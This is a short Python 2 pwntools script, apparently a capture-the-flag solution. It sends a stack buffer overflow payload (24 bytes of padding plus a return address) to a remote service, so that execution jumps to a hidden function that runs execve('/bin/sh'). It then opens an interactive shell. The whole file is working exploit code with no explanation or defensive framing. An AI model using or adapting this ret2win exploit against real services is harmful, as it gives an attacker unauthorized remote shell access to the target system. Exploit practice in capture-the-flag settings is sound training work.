#!/usr/bin/env python2 

from pwn import *

p = remote('isc.taiwan-te.ch', 10001)
payload = 'A'*(16 + 8) + p64(0x004006ac) 
#rbp - rsp = 0x10(16), ret to execve("/bin/sh", 0, 0)in <y0u_c4n7_533_m3>
p.sendline(payload)
p.interactive()
p.close()
